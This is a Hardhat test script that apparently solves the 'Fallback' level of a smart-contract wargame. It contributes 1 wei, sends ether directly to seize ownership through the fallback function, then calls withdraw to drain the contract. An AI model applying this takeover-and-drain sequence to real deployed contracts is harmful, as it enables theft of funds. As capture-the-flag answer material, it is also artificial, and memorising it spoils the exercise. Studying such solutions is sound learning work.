import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;
const LEVEL_ADDRESS = "0x9CB391dbcD447E645D6Cb55dE6ca23164130D008";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Fallback`);
  const challengeAddress = await createChallenge(
    LEVEL_ADDRESS
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  tx = await challenge.contribute({
    value: ethers.utils.parseUnits(`1`, `wei`),
  });
  await tx.wait();

  tx = await eoa.sendTransaction({
    to: challenge.address,
    value: ethers.utils.parseUnits(`1`, `wei`),
  });
  await tx.wait();

  tx = await challenge.withdraw();
  await tx.wait();
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
